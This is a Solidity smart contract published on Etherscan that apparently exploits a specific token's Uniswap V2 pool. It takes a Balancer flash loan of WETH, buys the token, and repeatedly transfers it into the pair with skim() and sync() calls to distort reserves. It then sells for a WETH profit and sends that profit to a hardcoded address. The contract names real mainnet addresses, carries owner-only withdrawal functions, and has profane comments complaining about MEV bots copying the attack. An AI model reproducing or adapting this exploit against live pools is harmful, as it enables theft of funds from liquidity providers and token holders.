/**
 *Submitted for verification at Etherscan.io on 2023-03-16
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

interface Jancok {
  function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external;
}

interface IERC20 {
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external view returns (string memory);

  function symbol() external view returns (string memory);

  function decimals() external view returns (uint8);

  function totalSupply() external view returns (uint256);

  function balanceOf(address owner) external view returns (uint256);

  function allowance(address owner, address spender)
  external
  view
  returns (uint256);

  function approve(address spender, uint256 value) external returns (bool);

  function transfer(address to, uint256 value) external returns (bool);

  function transferFrom(
    address from,
    address to,
    uint256 value
  ) external returns (bool);
  function withdraw(uint256 wad) external;
  function deposit(uint256 wad) external returns (bool);
}
interface Uni_Router_V2 {
  function WETH() external view returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
  external
  returns (
    uint256 amountA,
    uint256 amountB,
    uint256 liquidity
  );

  function addLiquidityETH(
    address token,
    uint256 amountTokenDesired,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  )
  external
  payable
  returns (
    uint256 amountToken,
    uint256 amountETH,
    uint256 liquidity
  );

  function factory() external view returns (address);

  function getAmountIn(
    uint256 amountOut,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountIn);

  function getAmountOut(
    uint256 amountIn,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountOut);

  function getAmountsIn(uint256 amountOut, address[] memory path)
  external
  view
  returns (uint256[] memory amounts);

  function getAmountsOut(uint256 amountIn, address[] memory path)
  external
  view
  returns (uint256[] memory amounts);

  function quote(
    uint256 amountA,
    uint256 reserveA,
    uint256 reserveB
  ) external pure returns (uint256 amountB);

  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETH(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountToken, uint256 amountETH);

  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountETH);

  function removeLiquidityETHWithPermit(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountToken, uint256 amountETH);

  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountETH);

  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountA, uint256 amountB);

  function swapETHForExactTokens(
    uint256 amountOut,
    address[] memory path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function swapExactETHForTokens(
    uint256 amountOutMin,
    address[] memory path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint256 amountOutMin,
    address[] memory path,
    address to,
    uint256 deadline
  ) external payable;

  function swapExactTokensForETH(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] memory path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] memory path,
    address to,
    uint256 deadline
  ) external;

  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] memory path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] memory path,
    address to,
    uint256 deadline
  ) external;

  function swapTokensForExactETH(
    uint256 amountOut,
    uint256 amountInMax,
    address[] memory path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] memory path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);
  // receive () external payable;
}
interface IBalancerVault {
  function flashLoan(
    address recipient,
    address[] memory tokens,
    uint256[] memory amounts,
    bytes memory userData
  ) external;
}
interface IUniswapV2Pair {
    function swap(
      uint256 amount0Out,
      uint256 amount1Out,
      address to,
      bytes calldata data
    ) external;
    function skim(address to) external;
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

contract BadexIreng is Jancok {
  IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  IERC20 TOKENADDR = IERC20(0x6460B9954A05714A1A8d36Bac6D8BC9B657352d7);

  address public TOKENADDR_WETH_PAIR = 0xa06EA8dCbeF3FeE861CDBf9D9772Bc04E454D3d4;
  address public WETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
  address public B4B1 = 0xB4B1aec2371D9DdC5833D045942E7c08C4a5DcEB;

  uint256 public amounts_borrow_token;
  uint256 public amounts_ether;
  
  Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
  IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

  function RecoverBEP20(address tokenAddress, uint256 tokenAmount) public payable returns(bool) {
    require(msg.sender == 0x999999c0b5c24aab8c8BD0c6e6b8aa3d0b105d09, "Goblok, Pekok Su!");
    require(tokenAddress != address(this));
    IERC20(tokenAddress).transfer(0x999999c0b5c24aab8c8BD0c6e6b8aa3d0b105d09, tokenAmount);
    return true;
  }

  function RecoverETH(uint256 tokenAmount) public payable returns(bool) {
    require(msg.sender == 0x999999c0b5c24aab8c8BD0c6e6b8aa3d0b105d09, "Goblok, Pekok Su!");
    payable(0x999999c0b5c24aab8c8BD0c6e6b8aa3d0b105d09).transfer(tokenAmount);
    return true;
  }

  function JembutKidang(uint256 amounts_e, uint256 amounts_b) public returns(bool) {
      require(msg.sender == 0x999999c0b5c24aab8c8BD0c6e6b8aa3d0b105d09, "Goblok, Pekok Su!");
      amounts_ether = amounts_e;
      amounts_borrow_token = amounts_b;

      address[] memory tokens = new address[](1);
      tokens[0] = address(WETH);
      uint256[] memory amounts = new uint256[](1);
      amounts[0] = amounts_ether;
      vault.flashLoan(address(this), tokens, amounts, "");
      return true;
  }

  function receiveFlashLoan(
    IERC20[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
  ) external override{
    tokens;
    amounts;
    feeAmounts;
    userData;

    address[] memory path = new address[](2);
    path[0] = address(WETH);
    path[1] = address(TOKENADDR);
    uint256[] memory getAmountsOut = Router.getAmountsOut(WETH.balanceOf(address(this)), path);
    uint256 WETH_balance = WETH.balanceOf(address(this));
    WETH.transfer(TOKENADDR_WETH_PAIR, WETH_balance);
    IUniswapV2Pair(TOKENADDR_WETH_PAIR).swap(
      amounts_borrow_token,
      0,
      address(this),
      ""
    );
      
    uint256 TOKENADDR_balance;
    TOKENADDR_balance = TOKENADDR.balanceOf(address(this));
    TOKENADDR.transfer(TOKENADDR_WETH_PAIR, (TOKENADDR_balance));
    IUniswapV2Pair(TOKENADDR_WETH_PAIR).skim(address(this));
    IUniswapV2Pair(TOKENADDR_WETH_PAIR).sync();

    TOKENADDR_balance = TOKENADDR.balanceOf(address(this));
    TOKENADDR.transfer(TOKENADDR_WETH_PAIR, (TOKENADDR_balance));
    IUniswapV2Pair(TOKENADDR_WETH_PAIR).skim(address(this));
    IUniswapV2Pair(TOKENADDR_WETH_PAIR).sync();

    path[0] = address(TOKENADDR);
    path[1] = address(WETH);
    getAmountsOut = Router.getAmountsOut(TOKENADDR.balanceOf(address(this)), path);
    TOKENADDR.transfer(TOKENADDR_WETH_PAIR, TOKENADDR.balanceOf(address(this)));
    IUniswapV2Pair(TOKENADDR_WETH_PAIR).swap(0, getAmountsOut[1], address(this), "");

    // ASU LO MEV, KOK BISA TEMBUS NGECOPY ANJING !!!
    uint256 WETH_PROFIT;
    WETH_PROFIT = getAmountsOut[1] - amounts_ether;
    WETH.approve(B4B1, type(uint).max);
    WETH.transfer(B4B1, WETH_PROFIT);
    // END ASU LO MEV, KOK BISA TEMBUS NGECOPY ANJING !!!

    WETH.transfer(address(vault), amounts_ether);
  }
}